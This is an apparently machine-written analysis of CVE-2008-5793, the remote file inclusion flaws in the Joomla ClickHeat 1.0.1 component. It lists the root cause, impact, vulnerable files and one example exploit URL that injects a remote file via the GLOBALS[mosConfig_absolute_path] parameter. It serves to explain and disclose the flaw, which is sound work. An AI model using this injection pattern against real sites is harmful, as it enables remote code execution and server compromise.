Based on the provided content, here's an analysis of CVE-2008-5793:

**Root Cause of Vulnerability:**

The root cause is the presence of multiple Remote File Inclusion (RFI) vulnerabilities in the Joomla! Component ClickHeat version 1.0.1. This occurs due to the use of `require_once` statements in several PHP files within the component which include external files based on user-supplied parameters, specifically `mosConfig_absolute_path` and `GLOBALS[mosConfig_absolute_path]`.

**Weaknesses/Vulnerabilities Present:**

*   **Remote File Inclusion (RFI):** The component fails to properly sanitize or validate the `mosConfig_absolute_path` parameter, allowing an attacker to include arbitrary remote files by manipulating this parameter in the HTTP request.
*   **Lack of Input Sanitization:** The component does not sanitize user-provided input that influences file inclusion, making it susceptible to RFI attacks.
*   **Global Variable Usage:** The usage of `$GLOBALS['mosConfig_absolute_path']` makes the application vulnerable to manipulation of this global variable via URL parameters.

**Impact of Exploitation:**

*   **Arbitrary Code Execution:** By including a malicious remote file, an attacker can execute arbitrary PHP code on the server.
*   **Complete System Compromise:** Successful code execution can potentially lead to a complete system compromise, depending on the permissions of the webserver process.
*   **Data Theft/Manipulation:** The attacker can potentially access, modify, or steal sensitive data.
*   **Website Defacement:** An attacker could deface the website by injecting malicious code.

**Attack Vectors:**

*   **HTTP GET Requests:** The vulnerabilities are exploited through crafted HTTP GET requests to vulnerable PHP files. These requests contain the `mosConfig_absolute_path` parameter, which is manipulated to point to an attacker-controlled remote file.
*   **URL Parameter Manipulation:** Attackers inject malicious URLs into parameters like `mosConfig_absolute_path` and `GLOBALS[mosConfig_absolute_path]` in the HTTP request.

**Required Attacker Capabilities/Position:**

*   **Remote Access:** The attacker must have network access to the vulnerable Joomla! installation.
*   **Knowledge of the Vulnerability:** The attacker must be aware of the specific vulnerable files and parameters within the `com_clickheat` component.
*   **Malicious File Hosting:** The attacker needs to host the malicious PHP file on a reachable server.

**Vulnerable Files:**

The following files are identified as vulnerable:

*   `administrator/components/com_clickheat/install.clickheat.php`
*   `administrator/components/com_clickheat/includes/heatmap/_main.php`
*   `administrator/components/com_clickheat/includes/heatmap/main.php`
*   `administrator/components/com_clickheat/includes/overview/main.php`
*   `administrator/components/com_clickheat/Recly/Clickheat/Cache.php`
*   `administrator/components/com_clickheat/Recly/Clickheat/Clickheat_Heatmap.php`
*   `administrator/components/com_clickheat/Recly/common/GlobalVariables.php`

**Exploit Examples:**

The provided exploit examples show how to inject malicious URLs via the vulnerable parameters. For example:

`http://localhost/[path]/administrator/components/com_clickheat/install.clickheat.php?GLOBALS[mosConfig_absolute_path]=[evilcode]`

Here, `[evilcode]` would be the URL of the attacker's malicious file.

**Additional Notes:**

The exploit-db entry confirms the vulnerability and provides a detailed list of the vulnerable files and example exploits. The securityreason.com content reiterates the same information, and includes some additional information such as CVSS score and CWE ID.
